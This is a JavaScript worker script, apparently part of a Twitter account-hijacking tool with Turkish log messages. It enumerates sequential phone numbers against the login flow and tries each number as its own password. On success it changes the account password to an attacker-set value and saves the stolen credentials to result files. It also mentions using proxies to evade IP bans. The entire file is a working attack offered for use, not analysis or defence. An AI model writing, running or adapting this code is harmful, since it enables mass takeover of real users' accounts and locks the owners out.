const {workerData, parentPort} = require('worker_threads');
const fs = require('fs');
const util = require('util');
const path = require('path');
const requests = require('./requests.js')
require('dotenv').config({path: path.resolve(__dirname, './config.env')});
const {
    v1: uuidv1, v4: uuidv4, v3: uuidv3,
} = require('uuid');

//const readFile = (filename) => util.promisify(fs.readFile)(path.resolve(__dirname, filename), 'utf8');
const appendFile = (filename, data) => util.promisify(fs.appendFile)(path.resolve(__dirname, filename), data, 'utf-8');

let phone_number = parseInt(workerData.value.gsm)
let country_code = workerData.value.countryCode
let country = workerData.value.country
let iterations = parseInt(workerData.value.iterations)
//let initial_zero_flag = process.env.INITIAL_ZERO_OMITTED
let new_password = process.env.NEW_PASSWORD
let guest_token, get_flow, ClientUUID, ClientVendorID, password, account
let fail_limit = parseInt(process.env.FAIL_LIMIT)
let fail_counter = 0

async function makeid(length) {
    let result = '';
    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}


/*
async function sleep(millis) {
    return new Promise(resolve => setTimeout(resolve, millis));
}
*/
async function InitTokens() {
    //const myip = await requests.getip();
    //console.log(myip);


    let ClientUUID = uuidv4().toUpperCase()
    //let ClientUUID = "5A5E31E2-E9C6-4EA6-B516-5B890AD54796";
    //let ClientVendorID = uuidv4().toUpperCase()
    let ClientVendorID = "33B232F0-092F-4242-AFD4-3BF2C8340749"

    guest_token = await requests.getGuest(ClientUUID, await makeid(16))
    while (guest_token.status === false) {
        console.error("guest_token error => " + guest_token.status)
        guest_token = await requests.getGuest(ClientUUID, await makeid(16))
    }

    get_flow = await requests.getFlow(ClientUUID, await makeid(16), ClientVendorID, guest_token.guest_token)
    while (get_flow.status === false) {
        console.error("flow_token error => " + get_flow.status)
        get_flow = await requests.getFlow(ClientUUID, await makeid(16), ClientVendorID, guest_token.guest_token)
    }

}

async function accountDuplication(ClientUUID, ClientVendorID, guest_token, password_attempt, get_flow) {
    let accountStatus = await requests.accountDuplication(ClientUUID, await makeid(16), ClientVendorID,
        guest_token.guest_token, password_attempt.flow_token, get_flow.att)
    return accountStatus
}

async function getScreenName(guest_token, password_attempt) {
    let screen_name = await requests.getScreenName(guest_token.guest_token, password_attempt.user_id)
    return screen_name
}

async function Login(ClientUUID, ClientVendorID, guest_token, get_flow, gsm) {
    let login_attempt = await requests.getLoginAttempt(ClientUUID, await makeid(16),
        ClientVendorID, guest_token.guest_token, get_flow.flow_token, gsm, get_flow.att);

    return login_attempt
}

async function Password(ClientUUID, ClientVendorID, guest_token, login_attempt, password, get_flow) {
    let password_attempt = await requests.getPasswordAttempt(ClientUUID, await makeid(16),
        ClientVendorID, guest_token.guest_token, login_attempt.flow_token, password, get_flow.att);
    return password_attempt
}

async function initLogin() {
    await InitTokens()

    for (let i = 0; i < iterations; i++) {
        if (fail_counter > fail_limit) break
        let gsm = country_code + (phone_number + i).toString()

        //Hesap denemesi
        let login_attempt = await Login(ClientUUID, ClientVendorID, guest_token, get_flow, gsm)

        if (login_attempt.status === false) {
            fail_counter += 1
            if (login_attempt.code === 239 || login_attempt.code === 366 || login_attempt.code === 88 ||
                login_attempt.code === 357) {
                await InitTokens()
                console.log("\x1b[31m", gsm + " => " + login_attempt.message)
                continue
            } else {
                console.log("\x1b[31m", gsm + " => " + login_attempt.message)
            }
        }

        //Hesabın şifresi tahmin ediliyor
        if (login_attempt.status === true && login_attempt.subtask_id === "LoginEnterPassword") {
            fail_counter = 0
            await appendFile('./results/found_numbers_' + country, gsm + "\n")
            password = "0" + (phone_number + i)


            let password_attempt = await Password(ClientUUID, ClientVendorID, guest_token, login_attempt, password, get_flow)

            if (password_attempt.status === false) {
                if (password_attempt.code === 239 || password_attempt.code === 366 || password_attempt.code === 88 ||
                    password_attempt.code === 357) {
                    await InitTokens()
                    continue
                } else {
                    console.log("\x1b[33m", gsm + ":" + password + " => " + password_attempt.message)

                    password = (phone_number + i).toString()

                    password_attempt = await Password(ClientUUID, ClientVendorID, guest_token, login_attempt, password, get_flow)

                    if (password_attempt.status === false) {
                        console.log("\x1b[33m", gsm + ":" + password + " => " + password_attempt.message)
                        await InitTokens()
                    }

                }

            }

            if (password_attempt.status === true) {
                console.log("hesaba girildi")
                let screen_name = await getScreenName(guest_token, password_attempt)
                console.log(JSON.stringify(screen_name) + "\n" + password)
                await InitTokens()
                login_attempt = await Login(ClientUUID, ClientVendorID, guest_token, get_flow, screen_name.screen_name)
                console.log(JSON.stringify(login_attempt))
                password_attempt = await Password(ClientUUID, ClientVendorID, guest_token, login_attempt, password, get_flow)
                console.log(JSON.stringify(password_attempt))
                let accountStatus = await accountDuplication(ClientUUID, ClientVendorID, guest_token, password_attempt, get_flow)
                //let accountStatus = await accountDuplication(ClientUUID, ClientVendorID, guest_token, password_attempt, get_flow)

                if (accountStatus.status === false) console.log("account status => " + JSON.stringify(accountStatus))
                else if (accountStatus.subtask_id === "LoginAcid") {

                    //Hesabın kullanıcı adı çekiliyor
                    screen_name = await getScreenName(guest_token, password_attempt)
                    if (screen_name === 358) console.log("user_id is invalid!")
                    if (screen_name.status === true) {

                        let user = await requests.getGuessScreenName(ClientUUID, await makeid(16), ClientVendorID,
                            guest_token.guest_token, accountStatus.flow_token, screen_name.screen_name, get_flow.att)

                        //Hesabın kullanıcı adı giriliyor
                        if (user.status === true) {
                            user.password = password
                            user.phone_number = gsm
                            account = user.screen_name + ":" + password + ":" + gsm
                            await appendFile('./results/succeed_numbers_' + country, account + "\n")
                            console.log("\x1b[34m", gsm + ":" + password + " => Hesaba giriş yapıldı, kontrol ediliyor!")

                            let changePass = await requests.changePass(ClientUUID, await makeid(16), user, new_password)
                            if (changePass?.status === "ok") {
                                account = user.screen_name + ":" + new_password
                                console.log("\x1b[32m", account + " => Hesap doğrulandı ve şifresi değiştirildi!")

                                await appendFile('./results/verified_users_' + country, account + ":" + gsm + "\n")
                                await InitTokens()
                            } else {
                                console.log("\x1b[36m", gsm + ":" + password + " => Hesap güvenlik kontrolünde!")
                                await InitTokens()
                            }
                        } else {
                            console.log(user)
                            await InitTokens()
                        }
                    } else {
                        console.log(screen_name)
                        await InitTokens()
                    }
                } else {
                    accountStatus.password = password
                    accountStatus.phone_number = gsm
                    account = accountStatus.screen_name + ":" + password + ":" + gsm
                    await appendFile('./results/succeed_numbers_' + country, account + "\n")
                    console.log("\x1b[34m", gsm + ":" + password + " => Hesaba giriş yapıldı, kontrol ediliyor!")

                    let changePass = await requests.changePass(ClientUUID, await makeid(16), accountStatus, new_password)
                    if (changePass?.status === "ok") {
                        account = accountStatus.screen_name + ":" + new_password
                        await appendFile('./results/verified_users_' + country, account + ":" + gsm + "\n")
                        console.log("\x1b[32m", account + " => Hesap doğrulandı ve şifresi değiştirildi!")
                        await InitTokens()
                    } else {
                        console.log("\x1b[36m", gsm + ":" + password + " => Hesap güvenlik kontrolünde!")
                        await InitTokens()
                    }
                }


            }
        } else if (login_attempt.status === true && login_attempt.subtask_id === "DenyLoginSubtask") {
            console.log("Please, check your PROXY settings and IP addresses. Because the Twitter have been banned last IP address")
        }

    }
}

initLogin().then(function () {
    parentPort.postMessage(
        "thread exit!"
    )
})



